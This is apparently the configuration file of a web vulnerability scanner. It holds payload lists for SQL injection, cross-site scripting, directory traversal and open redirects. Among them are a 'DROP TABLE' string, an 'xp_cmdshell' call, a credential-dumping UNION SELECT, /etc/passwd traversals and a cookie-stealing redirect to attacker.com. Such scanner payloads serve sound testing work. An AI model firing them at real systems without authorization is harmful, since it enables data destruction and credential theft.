# Web Vulnerability Scanner Configuration

# Crawling Settings
CRAWL_CONFIG = {
    "max_depth": 3,           # Maximum depth to crawl from root
    "max_pages": 100,         # Maximum number of pages to scan
    "delay": 0.5,            # Delay between requests (seconds)
    "timeout": 10,           # Request timeout (seconds)
    "max_workers": 5,        # Maximum concurrent threads
    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}

# File Extensions to Skip
SKIP_EXTENSIONS = [
    '.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.ico', '.pdf',
    '.zip', '.rar', '.tar', '.gz', '.mp3', '.mp4', '.avi', '.mov',
    '.woff', '.woff2', '.ttf', '.eot', '.svg', '.xml', '.txt'
]

# SQL Injection Test Payloads
SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "'; DROP TABLE users--",
    "' UNION SELECT NULL--",
    "admin'--",
    "1' AND '1'='1",
    "1' AND '1'='2",
    "' OR 'x'='x",
    "'; EXEC xp_cmdshell('dir')--",
    "' UNION SELECT username,password FROM users--"
]

# XSS Test Payloads
XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '"><script>alert("XSS")</script>',
    'javascript:alert("XSS")',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    '"><img src=x onerror=alert("XSS")>',
    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
    '<body onload="alert(\'XSS\')">',
    '<input onfocus="alert(\'XSS\')" autofocus>',
    '<details open ontoggle="alert(\'XSS\')">'
]

# Directory Traversal Payloads
DIRECTORY_TRAVERSAL_PAYLOADS = [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
    '....//....//....//etc/passwd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '..%2f..%2f..%2fetc%2fpasswd',
    '..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts'
]

# Open Redirect Test Payloads
OPEN_REDIRECT_PAYLOADS = [
    'https://evil.com',
    '//evil.com',
    'javascript:alert("redirect")',
    'data:text/html,<script>alert("redirect")</script>',
    'https://attacker.com/steal?cookie=' + 'document.cookie',
    '//attacker.com',
    'https://google.com@evil.com'
]

# Parameters that commonly handle redirects
REDIRECT_PARAMETERS = [
    'redirect', 'url', 'next', 'target', 'return', 'returnTo', 'goto',
    'link', 'out', 'view', 'dir', 'redir', 'destination', 'site'
]

# Sensitive Headers to Check
SENSITIVE_HEADERS = [
    'Server',
    'X-Powered-By',
    'X-AspNet-Version',
    'X-AspNetMvc-Version',
    'X-Runtime',
    'X-Version',
    'X-PHP-Version',
    'X-Backend-Server',
    'X-Server-Info'
]

# Error Patterns that Indicate Information Disclosure
ERROR_PATTERNS = [
    'stack trace',
    'error occurred',
    'exception details',
    'debug information',
    'mysql error',
    'postgresql error',
    'sql server error',
    'oracle error',
    'syntax error',
    'unclosed quotation mark',
    'division by zero',
    'null pointer exception',
    'index out of bounds',
    'file not found',
    'access denied',
    'permission denied'
]

# Sensitive File Patterns for Directory Traversal
SENSITIVE_FILE_PATTERNS = [
    'root:x:0:0:',
    'Administrator:',
    'mysql:x:',
    'apache:x:',
    'daemon:x:',
    'bin:x:',
    'sys:x:',
    'adm:x:',
    'uucp:x:',
    'guest:x:',
    'nobody:x:',
    'www-data:x:'
]

# Form Actions that Indicate State-Changing Operations
STATE_CHANGING_KEYWORDS = [
    'delete', 'update', 'modify', 'change', 'add', 'create', 'remove',
    'edit', 'save', 'submit', 'post', 'put', 'patch', 'destroy',
    'insert', 'replace', 'drop', 'alter', 'grant', 'revoke'
]

# Report Configuration
REPORT_CONFIG = {
    "include_evidence": True,
    "include_payloads": True,
    "include_headers": True,
    "include_parameters": True,
    "severity_colors": {
        "HIGH": "#e74c3c",
        "MEDIUM": "#f39c12",
        "LOW": "#27ae60"
    },
    "output_formats": ["json", "html", "txt"]
}

# Rate Limiting and Safety
SAFETY_CONFIG = {
    "max_requests_per_second": 10,
    "respect_robots_txt": True,
    "follow_redirects": False,
    "verify_ssl": False,
    "max_retries": 3,
    "backoff_factor": 0.3
}

# Logging Configuration
LOGGING_CONFIG = {
    "level": "INFO",
    "format": "%(asctime)s - %(levelname)s - %(message)s",
    "file": "web_scanner.log",
    "max_file_size": 10 * 1024 * 1024,  # 10MB
    "backup_count": 5
}

